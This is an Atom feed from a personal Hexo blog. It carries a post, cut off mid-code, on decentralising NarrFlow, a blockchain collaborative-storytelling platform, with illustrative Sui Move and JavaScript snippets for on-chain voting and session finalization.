<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dude&#39;s Blog</title>
  
  <subtitle>A Way of Killing time</subtitle>
  <link href="http://example.com/rss.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-09-13T14:25:58.418Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>DudeGuuud</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NarrFlow: A Journey Toward True Blockchain Decentralization</title>
    <link href="http://example.com/2025/09/13/MeAndNarrflow/"/>
    <id>http://example.com/2025/09/13/MeAndNarrflow/</id>
    <published>2025-09-13T14:25:55.192Z</published>
    <updated>2025-09-13T14:25:58.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>For a long time, blockchain technology has been primarily driven by capital speculation, with fewer people focusing on creating genuine entertainment experiences rather than monetary betting mechanisms. NarrFlow represents an attempt to break this pattern. If you observe the current blockchain gaming landscape, you’ll find that most projects are essentially sophisticated gambling platforms disguised as games. This artificial stimulation of reward mechanisms, while profitable, doesn’t contribute to healthy digital entertainment ecosystems.</p><h2 id="An-Introduction-to-NarrFlow"><a href="#An-Introduction-to-NarrFlow" class="headerlink" title="An Introduction to NarrFlow"></a>An Introduction to NarrFlow</h2><p>I explored a more accessible and traditional approach to blockchain-based collaborative storytelling. Imagine a platform where users can collectively determine the direction of narratives while maintaining democratic control over both content and governance mechanisms.</p><p>NarrFlow is a novel-based collaboration platform where users work together to create stories through consensus-driven voting. The platform eliminates gambling mechanics entirely—participants pay only minimal gas fees to contribute with equal opportunity. This represents a step toward genuine decentralization in blockchain entertainment.</p><h2 id="Current-Technical-Implementation-and-Limitations"><a href="#Current-Technical-Implementation-and-Limitations" class="headerlink" title="Current Technical Implementation and Limitations"></a>Current Technical Implementation and Limitations</h2><h3 id="Architecture-Overview"><a href="#Architecture-Overview" class="headerlink" title="Architecture Overview"></a>Architecture Overview</h3><p>The current NarrFlow implementation adopts a hybrid approach that balances user experience with decentralization principles, though with notable compromises:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Current Architecture Flow</span><span class="token function">Frontend</span> <span class="token punctuation">(</span>React<span class="token punctuation">)</span> → Backend <span class="token constant">API</span> <span class="token punctuation">(</span>Node<span class="token punctuation">.</span>js<span class="token operator">/</span>Express<span class="token punctuation">)</span> → <span class="token function">Database</span> <span class="token punctuation">(</span>Supabase<span class="token punctuation">)</span> → Smart <span class="token function">Contract</span> <span class="token punctuation">(</span>Sui<span class="token punctuation">)</span><span class="token comment">// Voting Process</span><span class="token number">1.</span> User submits proposal → Stored <span class="token keyword">in</span> Supabase<span class="token number">2.</span> Users cast votes → Recorded <span class="token keyword">in</span> database  <span class="token number">3.</span> Cron job monitors countdown → Server<span class="token operator">-</span>side timer<span class="token number">4.</span> Admin wallet executes → Writes winner to blockchain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Critical-Centralization-Issues"><a href="#Critical-Centralization-Issues" class="headerlink" title="Critical Centralization Issues"></a>Critical Centralization Issues</h3><p><strong>1. Voting Transparency Problem</strong></p><ul><li>All voting data resides in Supabase database</li><li>Users cannot independently verify vote integrity</li><li>Vote counting occurs on centralized servers</li></ul><p><strong>2. Single Point of Failure</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Problematic dependency on server availability</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">checkExpiredVotingSessions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">executeWinningProposal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Server crash = system halt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3. Trust Requirements</strong></p><ul><li>Backend holds admin private keys</li><li>Users must trust server operators</li><li>No cryptographic proof of fair voting</li></ul><h3 id="Why-These-Limitations-Exist"><a href="#Why-These-Limitations-Exist" class="headerlink" title="Why These Limitations Exist"></a>Why These Limitations Exist</h3><p>The centralized components weren’t implemented due to Layer1 blockchain limitations, but rather to optimize for:</p><ul><li>​<strong>Gas cost reduction</strong>​: Avoiding per-vote transaction fees</li><li>​<strong>User experience</strong>​: Instant feedback without blockchain confirmation delays</li><li>​<strong>Development simplicity</strong>​: Traditional web architecture patterns</li></ul><p>However, modern Layer1 solutions like Sui offer capabilities that make full decentralization feasible without sacrificing usability.</p><h2 id="Technical-Deep-Dive-Blockchain-Fundamentals"><a href="#Technical-Deep-Dive-Blockchain-Fundamentals" class="headerlink" title="Technical Deep Dive: Blockchain Fundamentals"></a>Technical Deep Dive: Blockchain Fundamentals</h2><h3 id="Understanding-Layer1-Capabilities"><a href="#Understanding-Layer1-Capabilities" class="headerlink" title="Understanding Layer1 Capabilities"></a>Understanding Layer1 Capabilities</h3><p><strong>Transaction Throughput Evolution:</strong></p><ul><li>Bitcoin: ~7 TPS (Transactions Per Second)</li><li>Ethereum: ~15 TPS</li><li><strong>Modern Layer1s:</strong><ul><li>Sui: 297,000 TPS theoretical, 65,000+ practical</li><li>Solana: 65,000 TPS</li><li>Avalanche: 4,500+ TPS</li></ul></li></ul><p><strong>Smart Contract Limitations vs Reality:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Move language on Sui supports complex logic</span>public entry fun <span class="token function">complex_voting_logic</span><span class="token punctuation">(</span>    session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">VotingSession</span><span class="token punctuation">,</span>    proposals<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token class-name">Proposal</span><span class="token operator">></span><span class="token punctuation">,</span>    voter_weights<span class="token punctuation">:</span> <span class="token class-name">Table</span><span class="token operator">&lt;</span>address<span class="token punctuation">,</span> <span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Modern contracts can handle sophisticated operations</span>    <span class="token comment">// including real-time calculations, dynamic rewards,</span>    <span class="token comment">// and multi-step consensus mechanisms</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Consensus-Mechanisms-and-Voting"><a href="#Consensus-Mechanisms-and-Voting" class="headerlink" title="Consensus Mechanisms and Voting"></a>Consensus Mechanisms and Voting</h3><p><strong>Byzantine Fault Tolerance in Practice:</strong></p><pre class="line-numbers language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; Blockchain consensus ensures voting integrityCONSENSUS_PROTOCOL:    FOR each voting transaction:        1. Cryptographic signature verification        2. Double-voting prevention          3. Immutable vote recording        4. Distributed validation across nodes            RESULT: Mathematically provable vote integrity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Gas Economics:</strong></p><ul><li>Sui’s gas model: Object-based pricing, not computation-based</li><li>Batch operations can reduce costs significantly</li><li>Sponsored transactions possible for user onboarding</li></ul><h2 id="Proposed-Decentralization-Improvements"><a href="#Proposed-Decentralization-Improvements" class="headerlink" title="Proposed Decentralization Improvements"></a>Proposed Decentralization Improvements</h2><h3 id="1-On-Chain-Voting-System"><a href="#1-On-Chain-Voting-System" class="headerlink" title="1. On-Chain Voting System"></a>1. On-Chain Voting System</h3><p><strong>Current vs Improved:</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Current: Centralized voting</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">vote</span><span class="token punctuation">(</span><span class="token parameter">proposalId<span class="token punctuation">,</span> userId</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> database<span class="token punctuation">.</span>votes<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">proposal_id</span><span class="token operator">:</span> proposalId<span class="token punctuation">,</span>        <span class="token literal-property property">user_id</span><span class="token operator">:</span> userId<span class="token punctuation">,</span>        <span class="token literal-property property">timestamp</span><span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Improved: Blockchain voting</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">vote</span><span class="token punctuation">(</span><span class="token parameter">sessionId<span class="token punctuation">,</span> proposalIndex</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> tx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransactionBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    tx<span class="token punctuation">.</span><span class="token function">moveCall</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PACKAGE_ID</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">::voting::cast_vote</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>        <span class="token literal-property property">arguments</span><span class="token operator">:</span> <span class="token punctuation">[</span>tx<span class="token punctuation">.</span><span class="token function">object</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">)</span><span class="token punctuation">,</span> tx<span class="token punctuation">.</span><span class="token function">pure</span><span class="token punctuation">(</span>proposalIndex<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">signAndExecuteTransaction</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Smart Contract Implementation:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Complete voting session structure</span>public <span class="token keyword">struct</span> <span class="token type-definition class-name">VotingSession</span> has key<span class="token punctuation">,</span> store <span class="token punctuation">&#123;</span>    id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>    proposals<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token class-name">Proposal</span><span class="token operator">></span><span class="token punctuation">,</span>    votes<span class="token punctuation">:</span> <span class="token class-name">Table</span><span class="token operator">&lt;</span>address<span class="token punctuation">,</span> <span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>        <span class="token comment">// voter -> proposal_index</span>    end_timestamp<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    min_votes_required<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    status<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span>                        <span class="token comment">// 0=active, 1=completed, 2=failed</span><span class="token punctuation">&#125;</span>public entry fun <span class="token function">cast_vote</span><span class="token punctuation">(</span>    session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">VotingSession</span><span class="token punctuation">,</span>    proposal_index<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> voter <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> current_time <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">epoch_timestamp_ms</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Validation</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span>current_time <span class="token operator">&lt;</span> session<span class="token punctuation">.</span>end_timestamp<span class="token punctuation">,</span> <span class="token constant">E_VOTING_ENDED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>session<span class="token punctuation">.</span>votes<span class="token punctuation">,</span> voter<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">E_ALREADY_VOTED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Record vote</span>    <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> session<span class="token punctuation">.</span>votes<span class="token punctuation">,</span> voter<span class="token punctuation">,</span> proposal_index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Update proposal vote count</span>    <span class="token keyword">let</span> proposal <span class="token operator">=</span> <span class="token namespace">vector<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> session<span class="token punctuation">.</span>proposals<span class="token punctuation">,</span> proposal_index<span class="token punctuation">)</span><span class="token punctuation">;</span>    proposal<span class="token punctuation">.</span>vote_count <span class="token operator">=</span> proposal<span class="token punctuation">.</span>vote_count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// Emit event for real-time updates</span>    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">VoteEvent</span> <span class="token punctuation">&#123;</span>        session_id<span class="token punctuation">:</span> <span class="token namespace">object<span class="token punctuation">::</span></span><span class="token function">id</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">,</span>        voter<span class="token punctuation">,</span>        proposal_index<span class="token punctuation">,</span>        timestamp<span class="token punctuation">:</span> current_time    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Decentralized-Timer-Mechanism"><a href="#2-Decentralized-Timer-Mechanism" class="headerlink" title="2. Decentralized Timer Mechanism"></a>2. Decentralized Timer Mechanism</h3><p><strong>Problem with Cron Jobs:</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Centralized timing - single point of failure</span>cron<span class="token punctuation">.</span><span class="token function">schedule</span><span class="token punctuation">(</span><span class="token string">'*/30 * * * * *'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">checkExpiredSessions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// What if server crashes?</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Blockchain-Native Solution:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Anyone can trigger session finalization</span>public entry fun <span class="token function">finalize_session</span><span class="token punctuation">(</span>    session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">VotingSession</span><span class="token punctuation">,</span>    story<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Story</span><span class="token punctuation">,</span>    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> current_time <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">epoch_timestamp_ms</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Time-based validation</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span>current_time <span class="token operator">>=</span> session<span class="token punctuation">.</span>end_timestamp<span class="token punctuation">,</span> <span class="token constant">E_NOT_EXPIRED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">E_ALREADY_FINALIZED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token punctuation">(</span>winner_exists<span class="token punctuation">,</span> winner_index<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">find_winning_proposal</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>winner_exists <span class="token operator">&amp;&amp;</span> <span class="token function">meets_minimum_threshold</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Execute winning proposal</span>        <span class="token keyword">let</span> winner <span class="token operator">=</span> <span class="token namespace">vector<span class="token punctuation">::</span></span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>session<span class="token punctuation">.</span>proposals<span class="token punctuation">,</span> winner_index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execute_story_update</span><span class="token punctuation">(</span>story<span class="token punctuation">,</span> winner<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Reward distribution</span>        <span class="token function">distribute_rewards</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> winner_index<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        session<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">// Create next voting round</span>        <span class="token function">create_next_session</span><span class="token punctuation">(</span><span class="token function">determine_next_type</span><span class="token punctuation">(</span>story<span class="token punctuation">)</span><span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Restart voting if insufficient participation</span>        session<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token function">create_retry_session</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>session_type<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Incentivize timely finalization</span>fun <span class="token function">distribute_rewards</span><span class="token punctuation">(</span>session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">VotingSession</span><span class="token punctuation">,</span> winner_index<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> total_pool <span class="token operator">=</span> <span class="token function">calculate_reward_pool</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> finalizer <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 70% to content winner</span>    <span class="token comment">// 20% split among voters  </span>    <span class="token comment">// 10% to finalizer (whoever calls this function)</span>    <span class="token function">reward_participants</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> winner_index<span class="token punctuation">,</span> finalizer<span class="token punctuation">,</span> total_pool<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-Event-Driven-Real-Time-Updates"><a href="#3-Event-Driven-Real-Time-Updates" class="headerlink" title="3. Event-Driven Real-Time Updates"></a>3. Event-Driven Real-Time Updates</h3><p><strong>Replace Database Polling with Blockchain Events:</strong></p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// Frontend event subscription</span><span class="token keyword">class</span> <span class="token class-name">BlockchainVotingService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">async</span> <span class="token function">subscribeToVotingUpdates</span><span class="token punctuation">(</span>sessionId<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">await</span> suiClient<span class="token punctuation">.</span><span class="token function">subscribeEvent</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            filter<span class="token operator">:</span> <span class="token punctuation">&#123;</span>                MoveEventType<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PACKAGE_ID</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">::voting::VoteEvent</span><span class="token template-punctuation string">`</span></span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token function-variable function">onMessage</span><span class="token operator">:</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>parsedJson<span class="token punctuation">.</span>session_id <span class="token operator">===</span> sessionId<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateVotingUI</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>parsedJson<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// Real-time vote counting from blockchain state</span>    <span class="token keyword">async</span> <span class="token function">getCurrentVotes</span><span class="token punctuation">(</span>sessionId<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token keyword">await</span> suiClient<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            id<span class="token operator">:</span> sessionId<span class="token punctuation">,</span>            options<span class="token operator">:</span> <span class="token punctuation">&#123;</span> showContent<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseVotingResults</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-Advanced-Consensus-Mechanisms"><a href="#4-Advanced-Consensus-Mechanisms" class="headerlink" title="4. Advanced Consensus Mechanisms"></a>4. Advanced Consensus Mechanisms</h3><p><strong>Weighted Voting Implementation:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public <span class="token keyword">struct</span> <span class="token type-definition class-name">VoterProfile</span> has key<span class="token punctuation">,</span> store <span class="token punctuation">&#123;</span>    id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>    contributions<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>        <span class="token comment">// Past story contributions</span>    reputation_score<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>     <span class="token comment">// Community-determined reputation  </span>    voting_power<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>         <span class="token comment">// Calculated voting weight</span><span class="token punctuation">&#125;</span><span class="token comment">// Calculate dynamic voting weights</span>fun <span class="token function">calculate_voting_power</span><span class="token punctuation">(</span>profile<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">VoterProfile</span><span class="token punctuation">,</span> session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">VotingSession</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> base_power <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> contribution_bonus <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>profile<span class="token punctuation">.</span>contributions <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> reputation_bonus <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>profile<span class="token punctuation">.</span>reputation_score <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        base_power <span class="token operator">+</span> contribution_bonus <span class="token operator">+</span> reputation_bonus<span class="token punctuation">&#125;</span><span class="token comment">// Quadratic voting to prevent vote buying</span>fun <span class="token function">apply_quadratic_voting</span><span class="token punctuation">(</span>raw_votes<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Cost increases quadratically: 1 vote = 1 token, 2 votes = 4 tokens, etc.</span>    <span class="token keyword">let</span> cost <span class="token operator">=</span> raw_votes <span class="token operator">*</span> raw_votes<span class="token punctuation">;</span>    cost<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Sybil Resistance Mechanisms:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Proof of contribution requirement</span>public entry fun <span class="token function">register_voter</span><span class="token punctuation">(</span>    registry<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">VoterRegistry</span><span class="token punctuation">,</span>    proof_of_contribution<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// IPFS hash of past contributions</span>    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> voter <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Verify minimum contribution threshold</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">verify_contribution_proof</span><span class="token punctuation">(</span>proof_of_contribution<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">E_INSUFFICIENT_CONTRIBUTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Stake requirement to prevent spam</span>    <span class="token keyword">let</span> stake <span class="token operator">=</span> <span class="token namespace">coin<span class="token punctuation">::</span></span><span class="token function">split</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> payment<span class="token 